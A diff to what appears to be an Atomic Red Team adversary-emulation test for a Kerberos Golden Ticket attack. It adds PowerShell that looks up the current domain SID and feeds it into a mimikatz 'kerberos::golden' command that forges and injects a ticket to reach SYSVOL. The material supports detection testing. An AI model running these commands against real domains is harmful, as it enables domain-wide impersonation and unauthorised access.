@@ -11,9 +11,9 @@ atomic_tests:
     - windows
   input_arguments:
     domain_sid:
-      description: Sid of the targeted domain
+      description: SID of the targeted domain, if you keep default it will automatically get the current domain SID
       type: string
-      default: S-1-5-21-1723555596-1415287819-2705645101
+      default: S-1-5-21-DEFAULT
     domain:
       description: Targeted domain FQDN
       type: string
@@ -50,6 +50,15 @@ atomic_tests:
       Remove-Item $env:TEMP\golden.bat -ErrorAction Ignore
       Remove-Item $env:TEMP\golden.txt -ErrorAction Ignore
 
+      # get current domain SID if default was used
+      $domain_sid = "#{domain_sid}"
+      If ($domain_sid -Match "DEFAULT") {
+        # code from https://www.sevecek.com/EnglishPages/Lists/Posts/Post.aspx?ID=60
+        $domain = gwmi Win32_ComputerSystem | Select -Expand Domain
+        $krbtgtSID = (New-Object Security.Principal.NTAccount $domain\krbtgt).Translate([Security.Principal.SecurityIdentifier]).Value
+        $domain_sid = $krbtgtSID.SubString(0, $krbtgtSID.LastIndexOf('-'))
+      }
+
       # create batch file with commands to run in a separate "runas /netonly" session
       # so we don't purge Kerberos ticket from the current Windows session
       # its output goes to golden.txt temp file, because we cannot capture "runas /netonly" output otherwise
@@ -57,7 +66,7 @@ atomic_tests:
       >%TEMP%\golden.txt 2>&1 (
         echo Purge existing tickets and create golden ticket:
         klist purge
-        #{mimikatz_path} "kerberos::golden /domain:#{domain} /sid:#{domain_sid} /aes256:#{krbtgt_aes256_key} /user:#{account} /ptt" "exit"
+        #{mimikatz_path} "kerberos::golden /domain:#{domain} /sid:DOMAIN_SID /aes256:#{krbtgt_aes256_key} /user:#{account} /ptt" "exit"
 
         echo.
         echo Requesting SYSVOL:
@@ -70,7 +79,7 @@ atomic_tests:
         echo.
         echo End of Golden Ticket attack
       )
-      "@ | Out-File -Encoding OEM $env:TEMP\golden.bat
+      "@ -Replace "DOMAIN_SID", $domain_sid | Out-File -Encoding OEM $env:TEMP\golden.bat
       
       # run batch file in a new empty session (password and username do not matter)
       echo "foo" | runas /netonly /user:fake "$env:TEMP\golden.bat" | Out-Null
